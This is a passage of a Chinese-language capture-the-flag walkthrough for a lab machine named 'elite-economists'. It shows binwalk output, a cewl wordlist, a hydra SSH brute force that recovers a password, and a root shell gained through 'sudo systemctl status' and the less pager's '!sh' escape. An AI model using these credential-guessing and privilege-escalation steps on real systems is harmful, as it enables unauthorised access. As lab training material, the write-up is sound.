887737        0xD8BB9         Zlib compressed data, default compression
888179        0xD8D73         Zlib compressed data, default compression
888642        0xD8F42         Zlib compressed data, default compression
889105        0xD9111         Zlib compressed data, default compression
890273        0xD95A1         Zlib compressed data, default compression
891440        0xD9A30         Zlib compressed data, default compression
892426        0xD9E0A         Zlib compressed data, default compression
893413        0xDA1E5         Zlib compressed data, default compression
893969        0xDA411         Zlib compressed data, default compression
894525        0xDA63D         Zlib compressed data, default compression
894981        0xDA805         Zlib compressed data, default compression
896108        0xDAC6C         Zlib compressed data, default compression
897235        0xDB0D3         Zlib compressed data, default compression
897869        0xDB34D         Zlib compressed data, default compression
898503        0xDB5C7         Zlib compressed data, default compression
899017        0xDB7C9         Zlib compressed data, default compression
899531        0xDB9CB         Zlib compressed data, default compression
900468        0xDBD74         Zlib compressed data, default compression
901405        0xDC11D         Zlib compressed data, default compression
902313        0xDC4A9         Zlib compressed data, default compression
903221        0xDC835         Zlib compressed data, default compression
903900        0xDCADC         Zlib compressed data, default compression
904578        0xDCD82         Zlib compressed data, default compression
905761        0xDD221         Zlib compressed data, default compression
906946        0xDD6C2         Zlib compressed data, default compression
908679        0xDDD87         Zlib compressed data, default compression
910411        0xDE44B         Zlib compressed data, default compression
916282        0xDFB3A         Zlib compressed data, default compression
922154        0xE122A         Zlib compressed data, default compression
927332        0xE2664         Zlib compressed data, default compression
932509        0xE3A9D         Zlib compressed data, default compression
933664        0xE3F20         Zlib compressed data, default compression
934819        0xE43A3         Zlib compressed data, default compression
935936        0xE4800         Zlib compressed data, default compression
937056        0xE4C60         Zlib compressed data, default compression
980829        0xEF75D         Zlib compressed data, default compression
1024599       0xFA257         Zlib compressed data, default compression
1025778       0xFA6F2         Zlib compressed data, default compression
1026957       0xFAB8D         Zlib compressed data, default compression
1027640       0xFAE38         Zlib compressed data, default compression
1028323       0xFB0E3         Zlib compressed data, default compression
1028815       0xFB2CF         Zlib compressed data, default compression
1029307       0xFB4BB         Zlib compressed data, default compression
1030781       0xFBA7D         Zlib compressed data, default compression
1032255       0xFC03F         Zlib compressed data, default compression
1033082       0xFC37A         Zlib compressed data, default compression
1033909       0xFC6B5         Zlib compressed data, default compression
1034675       0xFC9B3         Zlib compressed data, default compression
1035441       0xFCCB1         Zlib compressed data, default compression
1035855       0xFCE4F         Zlib compressed data, default compression
1036270       0xFCFEE         Zlib compressed data, default compression
1041490       0xFE452         Zlib compressed data, default compression
1046709       0xFF8B5         Zlib compressed data, default compression
1047570       0xFFC12         Zlib compressed data, default compression
1048430       0xFFF6E         Zlib compressed data, default compression
1049066       0x1001EA        Zlib compressed data, default compression
1049701       0x100465        Zlib compressed data, default compression
1050881       0x100901        Zlib compressed data, default compression
1052063       0x100D9F        Zlib compressed data, default compression
1052450       0x100F22        Zlib compressed data, default compression
1052836       0x1010A4        Zlib compressed data, default compression
1053537       0x101361        Zlib compressed data, default compression
1054239       0x10161F        Zlib compressed data, default compression
1054635       0x1017AB        Zlib compressed data, default compression
1055031       0x101937        Zlib compressed data, default compression
1055624       0x101B88        Zlib compressed data, default compression
1056217       0x101DD9        Zlib compressed data, default compression
1057035       0x10210B        Zlib compressed data, default compression
1057852       0x10243C        Zlib compressed data, default compression
1058196       0x102594        Zlib compressed data, default compression
1058541       0x1026ED        Zlib compressed data, default compression
1059460       0x102A84        Zlib compressed data, default compression
1060379       0x102E1B        Zlib compressed data, default compression
1061313       0x1031C1        Zlib compressed data, default compression
1062247       0x103567        Zlib compressed data, default compression
1062976       0x103840        Zlib compressed data, default compression
1063705       0x103B19        Zlib compressed data, default compression
1069678       0x10526E        Zlib compressed data, default compression
1075651       0x1069C3        Zlib compressed data, default compression
1076280       0x106C38        Zlib compressed data, default compression
1076910       0x106EAE        Zlib compressed data, default compression
1080273       0x107BD1        Zlib compressed data, default compression
1083636       0x1088F4        Zlib compressed data, default compression
1085021       0x108E5D        Zlib compressed data, default compression
1086404       0x1093C4        Zlib compressed data, default compression
1086739       0x109513        Zlib compressed data, default compression
1087076       0x109664        Zlib compressed data, default compression
1088457       0x109BC9        Zlib compressed data, default compression
1089837       0x10A12D        Zlib compressed data, default compression
1090357       0x10A335        Zlib compressed data, default compression
1090878       0x10A53E        Zlib compressed data, default compression
1099518       0x10C6FE        Zlib compressed data, default compression
1108156       0x10E8BC        Zlib compressed data, default compression
1109010       0x10EC12        Zlib compressed data, default compression
1109861       0x10EF65        Zlib compressed data, default compression
1110187       0x10F0AB        Zlib compressed data, default compression
1110516       0x10F1F4        Zlib compressed data, default compression
1110833       0x10F331        Zlib compressed data, default compression
1111150       0x10F46E        Zlib compressed data, default compression
1111501       0x10F5CD        Zlib compressed data, default compression
1111851       0x10F72B        Zlib compressed data, default compression
1112162       0x10F862        Zlib compressed data, default compression
1112474       0x10F99A        Zlib compressed data, default compression
1112792       0x10FAD8        Zlib compressed data, default compression
1113109       0x10FC15        Zlib compressed data, default compression
1113429       0x10FD55        Zlib compressed data, default compression
1113745       0x10FE91        Zlib compressed data, default compression
1114062       0x10FFCE        Zlib compressed data, default compression
1114261       0x110095        Zlib compressed data, default compression
1128766       0x11393E        Zlib compressed data, default compression
1129715       0x113CF3        Zlib compressed data, default compression
1142499       0x116EE3        Zlib compressed data, default compression
```

从中收集到了一些用户名

```
joseph
richard
crystal
catherine
```

再从80端口抓取一些，保存为user

```
┌──(kali㉿kali)-[~]
└─$ cewl -m 5 http://192.168.21.5
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
blind
texts
Marketing
behind
mountains
Consonantia
there
Services
About
Accounting
Economists
countries
Vokalia
Colorlib
Bookmarksgrove
control
Elite
powerful
Pointing
about
financial
Roger
Scott
their
Manager
Business
removed
Template
Instagram
Twitter
Facebook
assessment
licensed
under
Strategy
Market
regelialia
necessary
small
river
supplies
place
Separated
named
flows
Duden
March
right
Cases
wealth
Analysis
Consultancy
General
Structured
business
Contact
Advisor
almost
economists
elite
Alphabet
headline
Mountains
Italic
hills
improve
first
Village
reached
unorthographic
Brand
Message
Online
Started
Branding
Creative
Management
Sales
Consultation
loader
consultation
template
reserved
rights
Copyright
Dribbble
Privacy
Charts
Global
Security
Resources
Policies
Conditions
Terms
Contract
Discover
Financial
Connect
analysis
manage
Assestment
activities
mouth
factors
sentences
Expert
parts
roasted
environment
which
paradisematic
investments
country
retirement
Support
Advice
company
Welcome
Agency
language
large
Semantics
coast
managing
ocean
accounting
services
service
Admin
events
typically
includes
performance
liquidity
equity
levels
capital
structure
other
within
landscape
competitive
market
target
Compliance
Payroll
Growth
Funding
Access
Years
Experienced
specific
information
situation
consultants
organisation
position
profile
helping
industry
solve
problems
change
efficiency
assess
overall
condition
potential
vulnerability
adverse
economic
social
political
Questions
Frequently
detailed
fixed
problem
loans
funds
Feedbacks
businesses
requirements
Completed
Awards
those
Clients
Happy
Consultant
Testimonies
budgeting
Found
world
focus
spending
Address
Email
picture
touch
would
consectetur
future
entire
Study
Latest
clarity
achieving
guiding
significant
entrepreneurship
towards
savings
income
including
Innovate
goals
Price
Plans
Affordable
various
influenced
Packages
creation
Personal
Businesses
Premium
Ultimate
Wealth
individuals
planning
house
architect
construction
Paragraph
Lorem
ipsum
dolor
Server
create
build
builder
Cloud
Recent
Coaching
Relationships
People
Physical
Mental
Ubuntu
Apache
server
found
requested
Website
Phone
Suite
Street
suggestion
Subject
thank
message
section
numquam
cupiditate
fugit
inventore
similique
sapiente
culpa
placeat
delectus
mollitia
voluptate
necessitatibus
autem
itaque
Ducimus
adipisicing
regulations
compliant
organization
rules
complying
ourselves
assets
handle
hands
anything
count
round
makes
Money
booming
Finance
passion
working
dependability
wealthiest
providing
dedicated
Richie
could
think
provide
professional
Career
Categories
status
check
employee
wrong
something
WHOOPS
percnt
invest
percentage
money
Calculate
engaging
building
specifically
managers
product
engineers
developers
marketers
hacking
growth
professionals
firms
activity
limited
```

爆破一下ssh

```
┌──(kali㉿kali)-[~]
└─$ hydra -L user -P password ssh://192.168.21.5 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-06 11:55:08
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 112896 login tries (l:336/p:336), ~7056 tries per task
[DATA] attacking ssh://192.168.21.5:22/
[STATUS] 232.00 tries/min, 232 tries in 00:01h, 112669 to do in 08:06h, 11 active
[22][ssh] host: 192.168.21.5   login: joseph   password: wealthiest
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
┌──(kali㉿kali)-[~]
└─$ ssh joseph@192.168.21.5                                      
The authenticity of host '192.168.21.5 (192.168.21.5)' can't be established.
ED25519 key fingerprint is SHA256:nKBoUMUnxyKH34KaiDU6gjV4RVOrd181pL9rHCLLD0s.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.21.5' (ED25519) to the list of known hosts.
joseph@192.168.21.5's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 06 Mar 2026 04:57:50 PM UTC

  System load:  0.25               Processes:               120
  Usage of /:   47.0% of 11.21GB   Users logged in:         0
  Memory usage: 5%                 IPv4 address for enp0s3: 192.168.21.5
  Swap usage:   0%


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

51 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
New release '22.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


joseph@elite-economists:~$ 
```

# 权限提升

systemctl status会调用分页器pager，而less可以执行shell，我们能进入less，就可以直接弹shell

```
joseph@elite-economists:~$ sudo -l
Matching Defaults entries for joseph on elite-economists:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joseph may run the following commands on elite-economists:
    (ALL) NOPASSWD: /usr/bin/systemctl status
joseph@elite-economists:~$ sudo /usr/bin/systemctl status
!sh
# id
uid=0(root) gid=0(root) groups=0(root)
```
